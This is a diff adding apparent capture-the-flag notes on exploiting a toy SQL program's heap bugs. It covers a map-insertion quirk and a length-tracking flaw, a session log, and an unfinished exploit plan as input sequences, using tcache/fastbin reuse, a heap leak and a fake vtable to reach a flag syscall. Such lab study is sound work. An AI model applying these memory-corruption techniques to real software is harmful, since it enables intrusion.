@@ -1,0 +1,153 @@
+Observations:
+  operator= does not update variable this.len. Only this.data
+  it reserves enough space, but data's length according to len can be smaller (or larger) than data's len according to stlen() after setting something that's longer than the string's original length
+
+  operator+ uses this.len and other.len to for memory reservation
+  concatenation with strcncat (bounded by len + other.len + 1)
+  if wrong len is saved due to +, some or all of second string may not be copied. First string may be truncated as well depending on how wrong len is.
+
+
+I/O:
+
+Welcome to myFirstSQLExperience(TM)
+select * from * where 0 = 0;
+id         | str                                                                                       
+-------------------------------------------------------------------------------------------------------
+0          |                                                                                           
+insert into sometable VALUES (5, "BB");  
+select * from * where 1 = 0;
+id         | str                                                                                       
+-------------------------------------------------------------------------------------------------------
+0          | BB                                                                                        
+insert into sometable VALUES (6, "CC");
+select * from * where id = 6;
+id         | str                                                                                       
+-------------------------------------------------------------------------------------------------------
+6          | CC                                                                                        
+insert into sometable VALUES (7, "DDDDDDDD");
+select * from * where id = 7;
+id         | str                                                                                       
+-------------------------------------------------------------------------------------------------------
+7          | DDDDDDDD                                                                                  
+insert into sometable VALUES (8, "EEEEE");
+insert into sometable VALUES (9, "FFFFF");
+select * from * where id = 9;    
+id         | str                                                                                       
+-------------------------------------------------------------------------------------------------------
+9          | FFFFF                                                                                     
+insert into sometable VALUES (999, "AAAA");
+select * from * where id >= 999;
+id         | str                                                                                       
+-------------------------------------------------------------------------------------------------------
+999        | AAAA                                                                                      
+select * from * where id = 6;
+id         | str                                                                                       
+-------------------------------------------------------------------------------------------------------
+6          | EEEEE                                                                                     
+insert into sometable VALUES (1001, "GGGG");
+insert into sometable VALUES (1002, "HHHH");
+insert into sometable VALUES (1003, "IIII");
+select * from * where id >= 1001;
+id         | str                                                                                       
+-------------------------------------------------------------------------------------------------------
+1001       | GGGG                                                                                      
+1002       | HHHH                                                                                      
+1003       | IIII                                                                                      
+insert into sometable VALZES (1004, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
+insert into sometable VALZES (1004, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
+insert into sometable VALUES (1005, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+insert into sometable VALUES (1005, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB");
+element already exists!
+insert into sometable VALUES (1006, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB");
+select * from * where id = 1006; 
+id         | str                                                                                       
+-------------------------------------------------------------------------------------------------------
+1006       | AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB                        
+insert into sometable VALUES (1007, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHH");
+
+
+Observations:
+
+Instruction strings[ub]; is triggered for input:
+  select * from * where 0 = 0;
+  this tries to access strings with key 0.
+  this creates the element with key 0 with the empty String() constructor, since it doesn't already exist.
+  see https://en.cppreference.com/w/cpp/container/map/operator_at
+  the important part is the second 0 as well as the length of the first number.
+  for "select a from b where 1 = 42;" entry at index 42 would be created.
+
+Now we can get past the restriction, that the element with id 0 must exist.
+
+Notably, the data pointer of the sring point to an empty chunk of size 0x20 (in fastbin).
+
+If we allocate another string that fits in a fastbin of size 0x20 with the input
+  insert into sometable VALUES (1, "AA");
+  we get seperate String data structure, that has the same data pointer.
+
+If we chose a longer string, we can allocate something with a bigger chunk.
+
+If we for example use the following input:
+  insert into sometable VALUES (2, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB");
+  we get a chunk of size 0x50.
+  this is the same size as the sring data structure.
+
+If we now use the input:
+  select * from * where id = 2; 
+  we end up with an empty chunk of size 0x50 in the corresponding fastbin, that is still in use by the String from above (pointed to by data).
+
+If we now allocate another string, e.g. with:
+  insert ino sometable VALUES (3, "ABCDEFG");
+  the actual data structure of String will be allocated in the chunk of size 0x50.
+  Unfortunately the first field of this data structure is 0, so we cannot leak anything with that directly.
+  This does however allow us to write within the data structure arbitrarily and manipulate any heap pointers within.
+  We can also use partial override to shift a heap pointer a little bit.
+  A leak is not directly possible with this, since anything we write is terminated with a NULL byte.
+
+
+
+#overcome initial hurdle:
+select * from * where id = 0;
+#insert values:
+insert into table values (1, "AAAAAA");
+insert into table values (2, "BBBBBB");
+insert into table values (3, "CCCCCC");
+insert into table values (4, "DDDDDD");
+insert into table values (5, "EEEEEE");
+
+#free ech one by displaying:
+select * from * where id >= 1;
+
+#now 5 chunks are in tcache bin 0x20
+#remove next pointer in first element of tcache bin 0x20:
+update table set str = "aaaaa" where id = 5; 													#ommittable?
+update table set str = "aaaa" where id = 5;
+update table set str = "aaa" where id = 5;
+update table set str = "aa" where id = 5;
+update table set str = "a" where id = 5;
+update table se str = "" where id = 5;
+
+#remove remaining element from tcache 0x20 by allocating last chunk remaining in there
+insert into table values (6, "FFFFFF");
+
+#now try printing some element that's no longer in tcache to leak heap address from next pointer
+#This prevents double free check from failing
+select * from * where id = 3;  #SEGFAULT in free --> TODO: fix that..
+
+
+#continuation alternative 1:
+#We can do the same trick with chunk of size 0x50
+#then (as explained above) it is possible to allocate the data structure (map element) instead of the data into the chunk we freed and can now manipulate this one arbitrarily
+#Hence we can simply replace heap addresses with other heap addresses and (more importantly) again point a vpointer to a fake vtable
+
+#continuation alternative 2:
+#Once heap address is leaked we can craft fake chunk
+#Use NULL byte overflow in operator= to overflow into size of adjacent chunk
+#create fake chunk as in previous pwns to get overlapping chunks via free and coalescing
+#now we can manipulate the overlapped chunk and place ptr to fake vtable into the vpointer in there
+
+#The fake vtable will again replace the virtual destructor's address with a function pointer to invoke our syscall in order to get the flag
+
+
+
+
+
